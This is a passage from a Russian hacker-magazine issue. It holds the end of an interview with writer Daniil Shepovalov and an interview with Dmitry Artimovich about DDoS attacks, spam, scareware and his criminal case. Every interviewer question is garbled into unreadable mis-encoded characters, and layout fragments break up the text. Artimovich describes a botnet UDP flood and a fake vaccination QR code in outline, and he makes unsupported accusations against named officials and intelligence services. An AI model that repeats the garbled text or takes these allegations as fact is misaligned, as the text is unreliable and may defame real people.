совсем старых Magic Carpet, Pyromania... Пом ню, у меня диск с золотой повер-
хностью был, купил в «Доме книги» на Невском. Там был сборник такого рода
игру шек, очень благодарен человеку, который его записал. А так за новыми
дисками и я, и все мои друзья ездили стабиль но раз в неделю в Dixi на Горохо-
вой улице. Это важно!


— À â ðåäàêöèþ «Õàêåðà» òû òîãäà çàãëÿäûâàë? Èëè ïðîñòî ñëàë
òåêñò è åãî ïðèíèìàëè?
— Да, отправлял по email. Редак ция располагалась в Москве, а я жил в Питере.
Иног да приезжал в Москву, у меня тут родствен ники жили, друзья. В редак цию
заезжал за все время раз пять, может.


— Êàêîå âïå÷àòëåíèå â öåëîì áûëî îò ðåäàêöèè è îò ëþäåé,
êîòîðûå òàì ðàáîòàëè?
— От тех лет, конечно, сплошь позитивные теплые чувства и впечат ления, вре-
мя было кру тейшее. Редак ция тог да, кажет ся, была на Малой Дмит ровке,
но что я там делал — не пом ню. Из людей Син тез в первую очередь запом -
нился, неуем ной энергии человек. А так же Ноа, Холод, Карен Казарян, Игорь
Пискунов, Сергей Лян ге, Мэд док и дру гие. M. J. Ash в Питере жил, мы разок
виделись в Money Honey на Апрашке. С Колей Аватаром и Доном Руматой мы
много общались. С Аватаром у нас общие хобби были: рыбалка и космическая
игра, забыл, правда, название, там у кораблей имена инду ист ских персонажей:
Арджу на, Мара и прочие. Аватар в Питер приезжал ко мне. Син тез тоже при-
езжал несколь ко раз. Однажды он с толпой редак торов и авторов приг нал.
Пом ню, они почему-то очень обрадовались, увидев KFC на Невском, всей тол-
пой ломану лись туда. Я повеселился! Думаю: «Нормаль но, приехать в Питер,
послать всякую архитек туру и прочее, что обычно людей впечат ляет, и пойти
в KFC». А в Москве с теми, кого выше упомянул, чаще всего общались. Да и
не толь ко с ними, прямо всех-всех не перечислить. Сим биозис, Дронич, Илья
Алек сан дров — много с кем. С Син тезом, Сим биозисом и Бубликом мы как-то
ездили на Казан тип, было весело, Сим биозис пры гал в панам ке под Drum &
Bass. С Бубликом сейчас часто переписываемся. В ту же редак цию я, кстати,
и потом приезжал, ког да «Хакер Спец» был. Я там написал несколь ко статей
прямо в редак ции.


— Ïðèåõàë è òåáÿ ñðàçó óñàäèëè ðàáîòàòü?
— Да-да. Тог да Мэд док стал главредом «Спеца». И у него материалов не хва-
тало, а надо номер сдавать. Я сел и что-то написал, хотя хотел вместо этого
гулять по Москве.


— Íó âñå, áóäó çíàòü, ÷òî äåëàòü, êîãäà íå÷åãî ïóáëèêîâàòü.
Îêàçûâàåòñÿ, äîñòàòî÷íî ïîïðîñèòü òåáÿ íàïèñàòü ñòàòüþ!
— Нет, ты сначала выманиваешь меня на встречу и обещаешь всякие ниш тяки!
Вот, Даня, мы наш ли аппарат ный кошелек с бит коинами и хотим его тебе
подарить, потому что ты невыносимо классный чувак. А потом такой: «Тут кош -
мар, спасай!» Возвращаясь к моим визитам в «Хакер», даль ше я уже приезжал
на Льва Толстого, где был боль шой опен спейс. К Стасу Акимову, уже
в «Хулиган», ког да он после Холода стал его вести.


— Íàñêîëüêî òåáå âîîáùå áëèçêà õàêåðñêàÿ òåìà? Òâîè ñòàòüè
áûëè íåìíîæêî íå î òîì æå, î ÷åì âåñü îñòàëüíîé æóðíàë.
— Мне в первую очередь нравилась эстетика и сама куль тура. Условно говоря,
вось мибит ная музычка у кейгенов и ASCII-заставки. А так я не хакер, конечно.
Какая-то общая эру диция есть, но я не пен тестер, не взлом щик. Хотя попросил
тут на PHDays дру зей-пен тестеров дать мне ввод ный курс, чтобы я лучше
понимал, как все это работает. Они мне посоветовали курс Web Security
Academy, руки все никак не дойдут его пройти. А вот прог раммистом я себя
считаю, хотя и не прог раммирую профессиональ но. Но мне нравит ся прог -
раммировать для себя. Для души: пишешь код, и как буд то это упорядочивает
хаос. Несколь ко лет назад изу чил PHP. Мой кореш — кру той кодер, он за годы
работы для себя уже свой собствен ный фреймворк наработал с уклоном в ско-
рость, мы с ним много проектов вместе делали. Ког да изу чал PHP, он как гуру
выступал, я с ним кон суль тировался по сложным для меня вопросам. Потом
фреймворк Laravel на хорошем уровне изу чил, кон цепцию Model — View —
Controller, могу за день несложный сайт развернуть. Для любых проектов
полезно понимать, как реаль но там все внут ри устроено в любом приложении.
Теперь, ког да время есть, потихонь ку разбираюсь с JavaScript. Мне нравит ся
постоян но что-то новое для себя изу чать. У меня есть пара идей, которые
хотелось реализовать со временем. Условно говоря, построить кван тового
гипергуся на смарт-кон трак тах.


— Òî åñòü òåáÿ íå òÿíóëî ïîéòè ïîïðîáîâàòü ÷òî-òî èç òîãî, ÷òî â
ñîñåäíåé ðóáðèêå ïèñàëè?
— Во-первых, у меня такая, нем ножко идиотская законопослушность, что
парадок саль но для автора журнала «Хакер» тех времен. В середине девянос-
тых можно было, к примеру, не парить ся об авторских правах и запилить
какие-нибудь «Фиш ки-нет». В том онлайновом мире с тоталь ным дефицитом
кон тента такое поль зовалось огромным спросом. А я тупил и хотел соблюдать
авторские права. Что до «Хакера», то в сосед них рубриках писали много инте-
ресного, и про кардинг, и про все на свете. Как-то общался с состоятель ными
ребятами, они уже давно живут в Швейцарии. Они говорят: «Спасибо вам
всем за „Хакер“. Вы писали, а мы читали и делали». И неволь но думаешь:
«Блин, а что же там такое писали? Надо было вниматель нее читать…» Но в то
время я спрашивал себя «А это легаль но?» и как-то пробовать не хотел ничего,
что мог ло сулить проблемы с законом. Цитируя самого себя же: «Старый пират
торговал на Сен ной. Солнышко теплое этой весной. Выбиты зубы, в лег ком
заточка. На 1С работала дочка». Пом ню, я однажды в компь ютерном цен тре
мэрии Соснового Бора Doom тайно копировал на свои дискеты — потел, огля-
дывался и чувствовал себя лютым киберкриминалом  (тут зву чит музыка
из Mission Impossible). Что уж тут говорить о взломе.


— Çàòî òû óñïåë ïîïðîáîâàòü ñåáÿ â ãåéìäåâå! Ðàññêàæè ïðî
«ßäåðíûé òèòáèò». Âîîáùå ìûñëü äåëàòü èãðó îò òåáÿ èñõîäèëà
èëè êòî-òî òåáÿ ïîçâàë?
— У меня вообще чаще всего так происходит, если выражать ся современ ным
хипстерским нью-эйдж-слен гом, что, если от Вселен ной запрос приходит,
надо на него сог лашать ся, все будет кру то и откроются новые возможности.
Приш ли ребята из сту дии VZ Lab, питерские игроделы: «Давай сделаем игру».
Говорю: «Давайте! Какую?» Они: «Игра может быть любая, но надо, чтобы
это был квест». Потому что у них возможность была сделать квест и готовый
движок. В сту дии было много художников и хардкорный прог раммист Миша,
по совместитель ству технический руководитель проекта, он все объединял
и кон солидировал. Художники где-то в игре про него оставили пасхалку «Миш -
ка — тиран!». А тематику я взял первую, которая в голову приш ла, про сумас-
шедшую жизнь Петербурга и сумерки человечества. Если ты бывал в Питере,
ты понимаешь, что получилась слабая каль ка того, что там действитель но про-
исходит каждый день. Ког да, например, выходишь из мет ро «Автово» и у тебя
на глазах подъезжает машина, врезает ся в столб, из нее выползает бухой
мужик, блюет в урну, заползает назад в машину и уезжает, это обычный втор-
ник. «Бука» тог да издала игру, и людям зашел этот трешачок — бод рый,
веселый, кислотный. Время для этого было как раз под ходящее. Приколь но
было! Пом ню, держал в руках диск в этой красивой боль шой оран жевой короб-
ке.


— Êàê òâîå ó÷àñòèå âîîáùå âûãëÿäåëî? Òû íàïèñàë ñþæåò, ñöåíû,
îïèñàë ïåðñîíàæåé è âñå îòïðàâèë? Èëè áîëüøå ó÷àñòâîâàë â
ðàçðàáîòêå?
— VZ Lab располагалась недалеко от меня. Я жил в районе мет ро «Пионер-
ская», а сту дия в паре стан ций от нее была. Офис — в здании НИИ, я периоди-
чески туда приезжал. Почему-то мне особен но лифт запом нился и как его дол-
го ждать надо было. А делалась игра так: я писал частями, отдавал очеред ной
кусок, приезжал, мы что-то обсуждали. Потом из VZ Lab мне присылали
готовые арты, фоны, сцены, персонажей, я ком ментировал их. Собствен но,
от меня была в основном кон цепция, сценарий и эти правки. Например, я
говорил: «Давайте добавим здесь граффити с названием группы The Exploited,
а здесь кочку с поган ками нарису ем, а вот тут мини-игру с мед сестрой». То
есть я давал ком ментарии по деталям, часто — по мини-играм. Саунд трек
там, конечно, подобрался бом бический. Кстати, недавно узнал и поржал
от души: оказывается, у рэпера Славы КПСС в этом году вышел трек «Ядерный
тит бит». Я его нашел, послушал — песня не особен но бод рая, но все равно
приколь но, что пом нят. Кстати, из современ ных музыкан тов мы с Нейромона-
хом Феофаном общаемся периодически. Я ему все говорю, давай песню
про гусей запишем. У него в каком-то клипе как раз пан ки бегают за гусями,
так что тема ему близка. Кстати, мы хотели еще и напиток «Ядерный тит бит»
сделать. Могу рассказать, как это было.


— Ðàññêàæè, êîíå÷íî!
— После того как выш ла игра, мы хотели выпустить и слабоалкоголь ный
напиток с тем же названием. Это было бы абсолют но логично! Нам даже тех-
нолог разработал рецептуру. У меня на полке дома стояло несколь ко бутыло-
чек — штук пять-семь, с такой зеленоватой, чуть ли не светящейся жид костью
разных вку сов. Но там дело уперлось то ли в алкоголь ную мафию питерскую, то
ли в какие-то разрешения чиновников, то ли и в то и в дру гое одновремен но.
В общем, не получилось. Кстати, если это интервью будут читать здравомыс-
лящие ребята из «Очаково», «Волковской пивоварни», «Черноголовки» или еще
кто-то из этой индустрии, я пред лагаю запустить сейчас этот напиток. Потому
что «Кока-колы» нет, «Фан ты» нет, все ушли в закат. А что еще пить в России,
как не радиоак тивный лимонад? Будет официаль ный напиток всех городов
Росатома и лично Гордона Фримена! В Индии тоже его можно пить, да где
угод но. В Северной Корее вообще пойдет на ура, наверняка будет любимый
напиток товарища Кима под ким чи. В Иране можно каль яны на тит бите. Кок -
тейли на тит бите можно делать, например на основе любимых кок тейлей
Роберта Оппенгеймера. На мой взгляд, кру тая тема, очень перспек тивная.
Толь ко нужен стратегический партнер. Это я поль зуюсь рек ламны ми воз-
можностями сейчас.


— Òåìà îòëè÷íàÿ! Êñòàòè, Äèìà Àãàðóíîâ ìíå íåäàâíî
ðàññêàçûâàë, ÷òî Ïîêðîâñêèé çàíèìàåòñÿ ýòèêåòêàìè äëÿ
áóòûëîê. Ìîæåòå ñíîâà âìåñòå ïîðàáîòàòü.
— Срочно надо идти к Пок ровскому. Он же этикет ки делает для кого-то, кто их
на свою продук цию клеит. Может, что и получит ся. Пиво крафтовое хотя бы.
Но лучше светящийся лимонад! А его до чего угод но можно апгрейднуть:
от энергетиков до алкоголь ных кок тейлей.


— Ìû âûÿñíèëè, êàê òû íà÷àë ïèñàòü â «Õàêåð», íî íå ìåíåå
èíòåðåñíî, ïî÷åìó ïåðåñòàë. Êàê òàê âûøëî?
— Не знаю. Подысписался, думаю. Вроде пишешь, людям нравит ся, но ты
чувству ешь, что чуть ли не самоповторы уже идут. Пора закан чивать. Лучше
вовремя что-то завершать и уходить, а не бесконечно из пустого в порожнее
переливать. Меня тог да позвали на постоян ную работу в Bauer Media — круп-
ное немецкое издатель ство. Оно поначалу в России мощно шло, но со вре-
менем недооценило скорость развития интернета в стране и так же ушло,
как появилось. В журнале Insider еще поработал. Даль ше пош ли в основном
уже цифровые проекты. Кон тент-провайдер,  платежная  система,  всякие
онлайн-сервисы, потом RuTube, потом пред выборный проект с видеоблогера-
ми скан даль ный, ком мерческие digital-проекты, благот воритель ный проект
один делал интересный для безум ного миллиардера, эксплейнеры для крип-
тостартапов, креативные кон цепции, да много всего.


— Ðàññêàæåøü ÷òî-íèáóäü ïðî îñëèêîâ?
— Для меня это, видимо, важная тема. Рань ше были ослики, а теперь у меня
гуси. Я в своем телег рам-канале «Вечерний Даня» постоян но занимаюсь
гусификацией, чему читатели очень раду ются. Пишешь что-нибудь вдум чивое,
люди говорят: хватит вдум чивого, гусей тащи! Я так понял, что всег да нужно
какое-то тотем ное живот ное. Тог да был ослик, сейчас у меня гусь — тотем ное
живот ное.


— Ïî÷åìó âäðóã òàêàÿ ïåðåìåíà? Ìíå êàæåòñÿ, äëÿ òâîèõ
ïîêëîííèêîâ ýòî âîëíèòåëüíûé ìîìåíò, ÷òî òû ïåðåøåë íà ãóñåé.
— Гуси сейчас интереснее, перспек тивнее всего. Они дерзкие, веселые,
любят щипать ся и топтать гряд ки. Думаю, может, книгу даже написать «Гуси
в мировой куль туре». Кон спирологический боевик в духе Дэна Брауна. Глав-
ное, не слиш ком много гусиных тайн раскрыть, чтобы внезапно не пропасть.
Вообще, мне кажет ся, гуси не понимают, почему лысая обезь яна без клюва
является вершиной пищевой цепочки на планете и доминирующим видом.
Полная чушь, если взглянуть с гусиной точки зрения. Уверен, гуси недопо-
нимают этот момент. И возможно, будет какой-то эволюционный скачок,
при котором  гуси  станут на зем ле самыми  главными.  Гуси и роботы.
На человеков бы я не поставил сейчас в эволюционной гон ке, слабовато
человеки перформят по коллективному интеллек ту и скиллам к сохранению
вида, как мы все прек расно можем наблюдать. На эту тему, кстати, я сделал
неболь шой арт-проект «Масспсихозометр». Есть даже стикерпак «Масспси-
хозомет ра» для телеги, всем рекомен дую.


— Ñêàæè, à â äàëüíåéøåé êàðüåðå òåáå ñëàâà, êîòîðóþ ïðèíåñ
æóðíàë «Õàêåð», âîîáùå ñêàçûâàëàñü êàê-òî? È åñëè ñêàçûâàëàñü,
ïîëîæèòåëüíî èëè îòðèöàòåëüíî? Ïîíÿòíî, îñëîâ òåáå ñòîðîæèòü
íèêòî óæå íå äîâåðèò. Íî ìîæåò, è ïëþñû êàêèå-òî åñòü?
— Да я обычно особен но этого не афишировал. Но всег да находились люди,
которые узнавали, говорили: «Тот самый Даня?» Я говорю: «Да». Всег да
с ними хорошие отношения были, всег да хорошо было работать. Иног да
помогало. С коллегами по «Хакеру», кстати, иног да совместные проекты быва-
ют. Сим биозис, например, недавно заказы вал креативную кон цепцию лора
метавселен ной для крупного клиента их рек ламного агентства. Федор Добрян -
ский вообще меня целой стране посоветовал как эксперта по крипте, NFT
и прочему Web3, я теперь целую страну кон суль тирую по этим темам, чувствую
себя очень важным. Ну я и правда неплохо разбираюсь.


— Êñòàòè, ðàññêàæè, êàêèå ó òåáÿ ñåé÷àñ àêòèâíîñòè? Â êàêèõ
ôîðìàòàõ ìîæíî ïîçíàêîìèòüñÿ ñ òâîèì òâîð÷åñòâîì?
— Если вкрат це, то творческие проекты с компь ютерной графикой. Вот, нап-
ример, чисто для себя делал ролик про прик лючения гуся в российских метав-
селен ных. Или вот спецпроект про «Нейролом бард № 1 », где сдаешь мозги
в арен ду корпорациям. Если говорить про заказы, то чаще эксплейнеры, про-
моролики, в общем, то, где нужен интересный сценарий, визу ализация, компь -
ютерная графика, моушен-дизайн. У меня технический бэк граунд и при этом
гуманитарный склад ума, я лег ко разбираюсь в новых для меня технически
сложных вещах и могу их популярно и понят но объяснять людям с помощью
моушен-графики. Например, обращает ся криптостартап:  Layer-2-решение
по масштабированию эфира. У них там всякие Merkle-деревья, роллапы, хеши
и прочая абстрак тная мегадичь с точки зрения обычного человека. Надо разоб-
рать ся в этом и простым людям объяснить красиво, наг лядно и интересно,
почему все это — будущее и куда кон крет но нести свои старомод ные скучные
день ги, чтобы к нему прикоснуть ся. А вообще чем угод но занимаюсь на сты ке
креатива  и  графики:  от  интеграций  в  духе  дополненной  реаль ности
для интернет-шоу до анимирован ных стикерпаков для Telegram и NFT. Еще я
открыл чат «Нет воркистан » в телеге — элит ный LinkedIn эпохи постапокалип-
сиса. Там и пред ложения о работе бывают интересные, и персонажи тоже
появляют ся необычные. Кто-то ресурсы из игр разбирает на заказ, кто-то
Web3-продак та ищет, кто-то математика для шоу, гроубок сы с Ai пилят, есть
краснодеревщик свой. Рекомен дую всем посмотреть.


— NFT — ýòî ó òåáÿ ñåðüåçíî?
— Началось с того, что я из баночек «Ядерного тит бита» сделал NFT на блок -
чейне Solana, как раз чтобы разузнать, как это работает. На эфире тоже сделал
коллекцию. Там всякие графические видеоминиатюры про бит коин в упаковках
из реаль ного мира. Например, в одной из них Paulo Coinelho совету ет мар-
жиналь ным криптотрейдерам: «Be Brave. Take Risks. Get Liquidated». Часто даю
ком ментарии разным СМИ про крипту, NFT, Web3. О том, что кон суль тирую
одну из стран по этим темам, уже говорил. Взаимодействую с коллегами
из Binance и GetGems. Не так давно один известный проект обратился: делаем
теперь с ними коллекцию на TON. На днях одни ребята спрашивали, могу ли я
написать для них стратегию в области NFT.


— È ïîñëåäíèé âîïðîñ. Ïî÷åìó ðåøèë âåðíóòüñÿ â «Õàêåð» ÷åðåç
ñòîëüêî ëåò? È êàê òû âèäèøü ñâîé íîâûé ôîðìàò?
— В марте Игорь Пискунов пошутил в FB, что возобновляет издание журнала
«Хакер». Я заскринил и процитировал в телеге с таким ком ментом: «Я понял,
мы попали в тахионный поток и время потек ло в обратном направлении. Вот
уже журнал „Хакер“ запускают, следом поинт в FIDO надо будет получать,
а даль ше ZX Spectrum и пират ские игры из Поль ши с маг нитофон ных кассет».
Видимо, есть темы, у которых цикл двад цать лет. Не слу чайно у классиков веч-
но все через двад цать лет возвращают ся. А формат — это интервью с интерес-
ными киберперсонажами. Хакерами, майнерами, энтерпренерами, инженера-
ми и так далее. Мне всег да нравился жанр интервью, потому что это самая
простая возможность познакомить ся с интересными людь ми, выведать инсай-
ды, расширить нет ворк и все такое. Я Диме Агарунову как-то очень давно даже
пред лагал делать журнал Interview, но даль ше разговоров дело не пош ло,
а потом этот журнал кто-то со стороны реаль но запустил. А где совместить
интервью и технологии? «Хакер» — самое под ходящее издание. Про пери-
одичность точно сейчас не скажу. Как какого-то героя буду находить интерес-
ного, приду с материалом. Так что увидим ся!
GEEK





Дмит рий Арти мович — один из самых
известных на Западе  русских  хакеров.
Имен но он устро ил DDoS-ата ку пла теж-
ного шлю за Assist, в результате которой
«Аэроф лот» пол торы недели не мог при -       Даниил Шеповалов                                                                                                https://t.me/vecherniy_danya
нимать   опла ту.  Недав но   Арти мович           aprilkey@gmail.com
написал  кни гу  «Я —  хакер!  Хро ника
потерян ного  поколения»,  где  раскрыл
мно жество  инсай дов. Даня Шепова лов
про читал ее, слег ка ужаснулся некото рым
скан дальным под робностям и погово рил
с Дмит рием о его неп ростом опы те.




                    Не забудь под писаться на телег рам-канал Дани
                    Шепова лова « Вечерний Даня », чтобы не пропус -
                         кать новые авторские матери алы, и заг лядывай
                       на danya.ru.



— Êàê òåõíè÷åñêè ðåàëèçîâàëàñü òà DDoS-àòàêà, êàê ÷òî
ïðîèñõîäèëî?
—  Шесть десят  тысяч  ботов  одновремен но  стали  слать  UDP-пакеты
без какого-либо содержания на IP-адрес шлюза. UDP вытеснил все легитим -
ные пакеты, и шлюз перестал быть доступен. Иног да перек лючались на TCP-
флуд, но тут уже нужно сначала установить соединение, чтобы туда отправить
мусор. Классического GET-флу да по HTTPS не было, слиш ком проблематично
было реализовы вать SSL под ядро ОС. А UDP-флуд просто забивал канал пол-
ностью. Оказалось, что у платежного шлюза канал был чуть ли не 10 Мбит/с
всего.


— Îíè ïûòàëèñü îòáèâàòüñÿ? Óñïåøíî?
— Несколь ко дней сами, потом привлекли «Лабораторию Касперского».
С горем пополам через десять дней отбили атаку.


— Ïî÷åìó áûë âûáðàí èìåííî «Àýðîôëîò»?
— Это надо Врублевского спрашивать. Видимо, потому, что это крупный
государствен ный объект и должен охранять ся Цен тром информацион ной
безопасности (ЦИБ) ФСБ, который хотел дискредитировать господин Вруб-
левский.


— Èçíà÷àëüíî íå âîçíèêàëî íè îäíîé ìûñëè, ÷òî âñå ýòî
íàâåðíÿêà ïëîõî çàêîí÷èòñÿ? Çà÷åì âîîáùå ââÿçàëñÿ â ýòó
çàòåþ?
— Даже не возникало мыслей, что это незакон но. На тот момент мы с братом
силь но зависели финан сово от господина Врублевского, он финан сировал раз-
работ ку нашей фарма-партнерки. Плюс для меня это тог да был некий авто-
ритет (после статьи Форбса «Плохие парни русского интернета»). Поэтому
понимал, что, с одной стороны, раз этот человек смог заработать кучу денег,
значит, есть чему поучить ся у него, с дру гой стороны, отказались бы — зад -
винул бы нас на второй план.





— Òû îòêðîâåííî ïèøåøü î ñâîåé ñïàìåðñêîé àêòèâíîñòè,
ðàçðàáîòêå áîòíåòîâ è ïðî÷èõ ñïîðíûõ ñ òî÷êè çðåíèÿ çàêîíà
âåùàõ…
— Спам у нас не считает ся уголовно наказу емым, а на Западе об этом и так
знали. Михайлов все это давно слил, а Кребс опубликовал. Да и срок давности
там прошел. А за создание бот нета я тут получил срок. Так что я чист
перед законом.


— ×òî áîëüøå âñåãî çàïîìíèëîñü èç òþðåìíîãî îïûòà?
— Первые две недели в нашем «поселке строгого режима» (его так называли
за то, что никого не отпускали жить в город, а построения проводили по четыре
раза в день). На меня тог да пытался давить местный блат комитет, каждый
вечер  тянули  «пообщать ся»,  постоян но  пытались  зацепить. Прид рались
к телефону, якобы я его вытащил без их разрешения в лагерь, и прописали
за это в ухо. Но в итоге эту ситу ацию мы разрулили.





— Â òâîåé êíèãå ìíîãî ðàçëè÷íûõ ëîãîâ ÷àòîâ. Ãåðîè ëîãîâ íå
âîçðàæàþò?
— Я их не спрашивал. Эта переписка не включает в себя тайну семейной
или личной жизни, значит, не нарушает закон. Я даже просил своего юриста
вычитать текст, чтобы не было поводов.


— Âîò ýòà öèòàòà çàèíòåðåñîâàëà: «À ó íàñ òîãäà ñî ñïàéâàðû
êàïàëî äî ôèãà». Ìîæåøü ðàññêàçàòü ïîäðîáíåå ïðî spyware? Êàê
êîíêðåòíî åé çàíèìàëèñü, êàê çàðàáàòûâàëè è òàê äàëåå?
— Про это Кребс много писал. Scareware — пугалка, маскиру ющаяся, нап-
ример, под антивирус. Это такой вредонос, который спит после попадания
на ПК какое-то время, потом выскакивает и пред ставляет ся, например, анти-
виру сом. Естествен но, находит штук 20–30 разных троянов на ком пе и пред -
лагает их вылечить за покупку под писки бак сов в пят надцать. Здесь весь воп-
рос уты кался в процессинг, не каждый банк готов был принимать платежи
за откровен ное мошен ничество. Плюс по таким мерчантам  всег да был
повышен ный уровень фрода, который кон тролиру ется платежными системами.
В общем, тут самое труд ное было не сделать такой вредонос, а сделать прием
карт под него.


— À ñåé÷àñ êàê îáñòîÿò äåëà ñ ïðîöåññèíãîì ïîäîáíûõ âåùåé?
— Судя по всему, никак. Я не встречал такого в последнее время. После арес-
та господина Врублевского в 2011 году, по сути, отрасль умерла. Бан ки,
которые принимали такие платежи, попали под засветку и сейчас изображают
из себя белых и пушистых.


— Ïîìèìî ñïàìà è scareware, ÷òî åùå èíòåðåñíîãî áûëî?
— Фарма-партнерки, продававшие индийскую виаг ру. В общем, это был
основной инстру мент кон вертации тог да спама как почтового, так и поис-
кового. Rx-Promotion в свое время проводила вечерин ки, на одной из них даже
разыг рали слиток золота. А вот последняя их вечерин ка закон чилась плохо —
визитом ФСКН.


— Êñòàòè, à ChronoPay æå áûë ïåðâûì ýêâàéðèíãîì â Ðîññèè? Êàê
îí ïîÿâèëñÿ?
— Не первым. Я не знаю точной истории. Толь ко слу хи. Знаю, что изначаль но
партнером Врублевского был тот самый Гусев (desp), который нас с братом
слил в ФСБ.


— Òû ïèøåøü, ÷òî áîëüøàÿ ÷àñòü ñîòðóäíèêîâ ïëàòåæíûõ ñèñòåì
ðîâíûì ñ÷åòîì íè÷åãî íå ïîíèìàåò â ýêâàéðèíãå è ôèíàíñîâûõ
ðàñ÷åòàõ. Åñëè ñåñòü è îñíîâàòåëüíî â ýòîì ðàçîáðàòüñÿ, ìîæíî ñ
óëèöû çàéòè íà ðûíîê ñ íîâîé ïëàòåæíîé ñèñòåìîé?
— Продажи же у нас построены на личных связях. Игроков на рын ке слиш ком
много, поэтому технически или даже ставкой сейчас никого не удивишь. Кли-
ентов забирают вместе с сейлзами. Что, кстати, в тех же США незакон но.


— Öèòàòà: «Ðåïóòàöèÿ ãîäàìè íàðàáàòûâàëàñü íà ôîðóìàõ». ×òî ñ
ôîðóìîâ áîëüøå âñåãî çàïîìíèëîñü?
— На спам-доте были статусы Trusted — за таких людей должны были
поручить ся два дру гих участника (с таким же статусом), и они несли за их дей-
ствия (тех, за кого поручились) финан совую ответствен ность.





— Åñëè óáðàòü çà ñêîáêè âîïðîñ çàêîííîñòè, êàêèì ñâîèì
äîñòèæåíèåì òû ãîðäèøüñÿ áîëüøå âñåãî?
— Я бы сказал так, боль ше всего фана в последнее время мне доставило сде-
лать фейковый QR-код сертификата вак цинации. Тут особо хакерского-то
и нету ничего, идея из фишин га (создает ся клон Госуслуг СЕРТИФИКАТ ДЕЙ-
СТВИТЕЛЕН и записы вает ся в QR-код).


— À èç ÷óæîé äåÿòåëüíîñòè ÷òî âïå÷àòëèëî?
— Восхищался, как был написан спам-бот Srizbi (Reactor Mailer), который
работал с сетью на самом низком уровне, фак тически сам реализовал стек
протоколов TCP/IP.


— Âîîáùå ñëåäèøü çà àêòèâíîñòüþ êàêèõ-íèáóäü ãðóïï?
— Я не слежу за ними. Как-то свобод ного времени на это нет. Плюс боль шая
часть таких вот хакерских групп — просто фейки от спецслужб. Вербуют сот -
рудника какой-то ком пании (партии и так далее), его руками скачивают
докумен ты,  а потом выкиды вают  их  в  сеть и обыг рывают,  как  буд то
какой-нибудь «Анонимус» взломал и слил в сеть сек ретные дан ные.


— ×òî äóìàåøü ïðî äåëî Èëüè Ñà÷êîâà?
— Думаю, что его дело напрямую связано с делом Сережи Михайлова, что,
скорее всего, они на пару сливали дан ные по россиянам в Штаты. Михайлова
посадили, а до Сачкова не дош ло, что нужно прек ратить сту чать на Запад. Сач-
ков же проводил экспертизу по делу «Аэрофлота» на взят ку от Гусева.


— Ïîñëå ñòàòüè How Russia Recruited Elite Hackers for Its Cyberwar
íà ãëàâíîé NYTimes.com òû ñòàë îäíèì èç ñàìûõ èçâåñòíûõ
ðóññêèõ õàêåðîâ íà Çàïàäå. Ìåøàåò èëè, íàîáîðîò, ïîìîãàåò ýòà
ðåïóòàöèÿ?
— Да всем плевать, по сути. Вообще никак не отразилось. Толь ко куча жур-
налистов наших и зарубежных хотела услы шать от меня фразу «Мы выбрали
Трам па по заказу Крем ля». Да Кремль о нас даже и не знает. После того как я
уволился из ChronoPay, работу мне пред ложил толь ко мой друг Руслан Ман -
нанов в RBK.Money. Это был единствен ный слу чай.




                   How  Russia  Recruited   Elite  Hackers  for   Its
                        Cyberwar



— À èíîñòðàííûå ñïåöñëóæáû íà òåáÿ íå ïûòàëèñü âûõîäèòü? Åñëè
Êðåìëþ õàêåðû íå íóæíû, òî èì-òî, ïîõîæå, ïðèãîäÿòñÿ.
— Насколь ко я понимаю, запад ные спецслужбы и работали с русскими хакера-
ми через Михайлова. Он тог да возглавлял оперативный отдел ЦИБ ФСБ,
как раз он и вербовал хакеров. А Запад давал задания, что сделать, например
под бросить улики выборов хакерами Трам па. При этом во всем виноваты рус-
ские. Очень удобно. Сейчас эта связь разорвана, а в запад ные страны я
не езжу.





— Òû ïèøåøü, ÷òî íà íåêîòîðûå èäåè òåáÿ âäîõíîâèë àíàëèç êîäà
Half-Life 2. À ÷òî åùå âäîõíîâëÿëî?
— Статья в Forbes «Плохие парни русского интернета». Правда, как оказалось,
плохой был пример. После знакомства с тем же RedEye меня до сих пор прес-
леду ют неприят ности.


— À èç ìàññîâîé êóëüòóðû?
— Фильм «Хакеры» 1995 года. Там, конечно, очень много визу аль но приукра-
шено, но дух того времени передан хорошо.


— Çàïîìíèëñÿ ìîìåíò, êàê òû âçÿë ðàáî÷èé íîóò Asus ñàìîé
ïðîñòîé êîíôèãóðàöèè, ÷òîáû, êîãäà îòáåðóò, íå áûëî æàëêî.
À ñåé÷àñ æå ó òåáÿ çàáðàëè òåõíèêó? ×òî çà íîóò?
— В марте этого года у меня забрали три ноут бука: мой рабочий HP EliteBook
x360 1040 G7 (Intel Core i7 10710U, 1,1–4,7 ГГц, 32 768 Мбайт, 14" Full HD
1920 × 1080, 1000 Гбайт SSD) и два старых HP EliteBook’а (один из них суп-
руги). Выг ребли из сейфа все сбережения и тоже забрали их. При этом руково-
дитель группы обыска звонил Евгению Морозову (следователь, который ведет
дело) и спрашивал: точно ли забирать день ги? Потому что меня, как и восем -
надцать дру гих человек, привлекли к уголовному делу против Врублевского
как свидетеля. Если ноут буки хоть как-то можно обосновать (экспертиза), то
забирать день ги у свидетеля незакон но. В общем, я получил том уголовного
дела. Конечно, я не могу разглашать сведения пред варитель ного следствия,
но оснований для обыска у меня не было никаких. При этом от меня очень
хотели пароли от ноут буков. А сам Морозов уверял меня, что, если найдет
крипту на моих дисках, ее ник то не тронет, а день ги он обещал вернуть сразу
же. Прош ло уже четыре месяца, следователь отказывается возвращать день ги.
Мы сейчас это в суде обжалуем, а суд даже отказывается принять заявление
к производству. Апелляцию по обыску Мосгорсуд вообще потерял — не могут
найти докумен ты. Какие-то чудеса. С техникой сложнее. Купить ноут бук такого
класса в РФ сейчас прак тически невозможно — их просто нет. Абсолют но уве-
рен (тем более я видел том уголовного дела), что дело заказное. Полагаю,
у следователя есть интерес к моим кон фискован ным день гам. Полагаю, он
хотел поставить меня в безвыход ное положение (кроме ноут буков, они заб-
рали все бэкапы — это как они думают) и заставить с ним общать ся. Даль ше
прописать на попыт ке дать взят ку и забрать вообще все. Но я же не такой
дурак, каким был десять лет назад. Бэкапы я не толь ко дома держу. Но вот
у господина Морозова есть разрешение на обыск моего второго места пре-
бывания. И я на полном серь езе считаю, что он может прийти еще раз. Я
про него в книге написал и в интервью говорю. А он в отместку под чистит
еще одну квартиру…


— Íàñ÷åò óïîìÿíóòîé òîáîé êðèïòû: ÷òî â öåëîì äóìàåøü î åå
ïåðñïåêòèâàõ?
— Крипта не заменит фиат ные день ги. Просто потому, что тог да государство
потеряет кон троль над эмиссией денег и расходами населения. Это при усло-
вии нормаль ной децен трализован ной крипты, а не тех поделок в виде циф-
